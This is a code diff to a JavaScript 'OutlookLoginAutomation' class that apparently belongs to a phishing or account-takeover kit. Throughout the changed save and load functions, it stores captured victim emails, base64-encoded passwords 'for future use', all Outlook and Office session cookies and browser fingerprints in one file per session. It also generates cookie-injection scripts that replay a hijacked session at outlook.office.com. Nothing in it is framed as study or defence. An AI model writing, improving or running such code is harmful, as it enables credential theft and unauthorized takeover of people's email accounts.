@@ -786,52 +786,24 @@ class OutlookLoginAutomation {
                 fs.mkdirSync(sessionDir, { recursive: true });
             }
 
-            // Create session-specific directory for individual cookie files
+            // Create session file with all cookies in one place
             const sessionId = Date.now();
             const sessionTimestamp = new Date().toISOString();
             const sessionEmail = email || 'unknown';
-            const sessionSubDir = path.join(sessionDir, `session_${sessionId}_${sessionEmail.replace(/[^a-zA-Z0-9]/g, '_')}`);
-            
-            if (!fs.existsSync(sessionSubDir)) {
-                fs.mkdirSync(sessionSubDir, { recursive: true });
-            }
+            const sessionFileName = `session_${sessionId}_${sessionEmail.replace(/[^a-zA-Z0-9]/g, '_')}.json`;
+            const sessionFilePath = path.join(sessionDir, sessionFileName);
 
-            console.log(`📁 Creating individual cookie files in: ${sessionSubDir}`);
+            console.log(`📄 Creating single session file: ${sessionFileName}`);
 
-            // Save each cookie to its own file
-            const cookieFiles = [];
-            uniqueCookies.forEach((cookie, index) => {
-                const cookieFileName = `cookie_${index + 1}_${cookie.name}_${cookie.domain.replace(/[^a-zA-Z0-9]/g, '_')}.json`;
-                const cookieFilePath = path.join(sessionSubDir, cookieFileName);
-                
-                const cookieData = {
-                    id: `${sessionId}_${index}`,
-                    timestamp: sessionTimestamp,
-                    email: sessionEmail,
-                    cookie: cookie,
-                    metadata: {
-                        domain: cookie.domain,
-                        name: cookie.name,
-                        essential: true,
-                        secure: cookie.secure
-                    }
-                };
-
-                fs.writeFileSync(cookieFilePath, JSON.stringify(cookieData, null, 2));
-                cookieFiles.push(cookieFilePath);
-                console.log(`💾 Saved cookie: ${cookieFileName}`);
-            });
-
-            // Create session metadata file
-            const sessionMetadataFile = path.join(sessionSubDir, 'session_metadata.json');
-            const sessionMetadata = {
+            // Create comprehensive session data with all cookies in one file
+            const sessionData = {
                 id: sessionId,
                 timestamp: sessionTimestamp,
                 email: sessionEmail,
                 password: password ? Buffer.from(password).toString('base64') : null,
                 totalCookies: uniqueCookies.length,
                 domains: domains,
-                cookieFiles: cookieFiles.map(file => path.basename(file)),
+                cookies: uniqueCookies,
                 userAgent: await this.page.evaluate(() => navigator.userAgent),
                 browserFingerprint: {
                     viewport: await this.page.viewport(),
@@ -840,18 +812,18 @@ class OutlookLoginAutomation {
                 }
             };
 
-            fs.writeFileSync(sessionMetadataFile, JSON.stringify(sessionMetadata, null, 2));
-            console.log(`📋 Session metadata saved: ${sessionMetadataFile}`);
+            fs.writeFileSync(sessionFilePath, JSON.stringify(sessionData, null, 2));
+            console.log(`💾 Session saved with ${uniqueCookies.length} cookies in single file`);
 
-            // Create individual injection script for this session
-            const sessionInjectScript = path.join(sessionSubDir, 'inject_session.js');
+            // Create injection script for this session
+            const sessionInjectScript = path.join(sessionDir, `inject_session_${sessionId}.js`);
             const sessionScriptContent = `
-// Individual Session Cookie Injector
+// Session Cookie Injector
 // Auto-generated on ${sessionTimestamp}
 // Session: ${sessionEmail} (${uniqueCookies.length} cookies)
 
 (function() {
-    console.log('🚀 Injecting ${uniqueCookies.length} individual cookies for session: ${sessionEmail}');
+    console.log('🚀 Injecting ${uniqueCookies.length} cookies for session: ${sessionEmail}');
     
     const sessionInfo = {
         email: '${sessionEmail}',
@@ -880,7 +852,7 @@ class OutlookLoginAutomation {
         }
     });
 
-    console.log('✅ Successfully injected ' + injected + ' individual cookies!');
+    console.log('✅ Successfully injected ' + injected + ' cookies!');
     console.log('🌐 Navigate to https://outlook.office.com/mail/ to test');
 
     // Auto-redirect option
@@ -892,11 +864,10 @@ class OutlookLoginAutomation {
 })();`;
 
             fs.writeFileSync(sessionInjectScript, sessionScriptContent);
-            console.log(`🔧 Individual injection script: ${sessionInjectScript}`);
+            console.log(`🔧 Injection script created: ${sessionInjectScript}`);
 
-            console.log(`✅ Individual session saved with ${uniqueCookies.length} cookies in separate files`);
-            console.log(`📁 Session directory: ${sessionSubDir}`);
-            console.log(`📋 Metadata file: ${sessionMetadataFile}`);
+            console.log(`✅ Session saved with ${uniqueCookies.length} cookies in single file`);
+            console.log(`📄 Session file: ${sessionFilePath}`);
             if (email) console.log(`📧 Email captured: ${email}`);
             if (password) console.log(`🔑 Password captured and encoded for future use`);
 
@@ -908,7 +879,7 @@ class OutlookLoginAutomation {
             });
             console.log('✅ Redirected to office.com successfully');
 
-            return sessionSubDir;
+            return sessionFilePath;
 
         } catch (error) {
             console.error('❌ Error saving enhanced session:', error.message);
@@ -923,13 +894,42 @@ class OutlookLoginAutomation {
             const fs = require('fs');
             const path = require('path');
 
-            // Check if sessionPath is a directory (new format) or file (legacy)
+            // Check if sessionPath is a file (new format) or directory (old format)
             let sessionData;
             let cookies = [];
             
-            if (fs.lstatSync(sessionPath).isDirectory()) {
-                // New individual files format
-                console.log('📁 Loading from individual cookie files directory');
+            if (fs.lstatSync(sessionPath).isFile()) {
+                // New single file format
+                console.log('📄 Loading from single session file');
+                
+                if (!fs.existsSync(sessionPath)) {
+                    console.log('❌ Session file not found');
+                    return false;
+                }
+                
+                try {
+                    sessionData = JSON.parse(fs.readFileSync(sessionPath, 'utf8'));
+                    cookies = sessionData.cookies || [];
+                    
+                    console.log(`📋 Loaded session data for: ${sessionData.email}`);
+                    console.log(`📊 Found ${cookies.length} cookies in single file`);
+                    
+                    // Check if target email matches (if specified)
+                    if (targetEmail && sessionData.email !== targetEmail) {
+                        console.log(`❌ Email mismatch: expected ${targetEmail}, found ${sessionData.email}`);
+                        return false;
+                    }
+                    
+                    console.log(`📦 Successfully loaded ${cookies.length} cookies from single file`);
+                    
+                } catch (e) {
+                    console.log(`⚠️ Failed to parse session file: ${e.message}`);
+                    return false;
+                }
+                
+            } else if (fs.lstatSync(sessionPath).isDirectory()) {
+                // Old individual files format (for backward compatibility)
+                console.log('📁 Loading from legacy individual cookie files directory');
                 
                 // Load session metadata
                 const metadataFile = path.join(sessionPath, 'session_metadata.json');
